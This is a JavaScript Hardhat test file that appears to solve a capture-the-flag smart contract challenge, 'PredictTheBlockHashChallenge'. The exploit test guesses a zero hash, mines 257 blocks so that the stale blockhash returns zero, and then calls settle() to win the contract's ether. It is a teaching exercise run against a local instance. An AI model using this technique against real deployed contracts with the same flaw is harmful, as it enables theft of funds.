const { expect } = require('chai');
const { ethers } = require('hardhat');

describe('Predict the Bloack Hash', function () {
    let deployer, attacker;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const Factory = await ethers.getContractFactory('PredictTheBlockHashChallenge', deployer);
        this.predictTheBlockHash = await Factory.deploy({value: ethers.utils.parseUnits("1")});
    });
    //Wait till 256 blocks pass and I know the blockHash is 0x00
    it('Exploit', async function () {
       let victimInstance = this.predictTheBlockHash.connect(attacker);
       await victimInstance.lockInGuess(ethers.utils.hexZeroPad("0x00", 32), {value: ethers.utils.parseUnits("1")});
       await ethers.provider.send("hardhat_mine", ["0x101"]);
       await victimInstance.settle();
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        expect(
            await this.predictTheBlockHash.isComplete()
        ).to.be.eq(true);
    });
});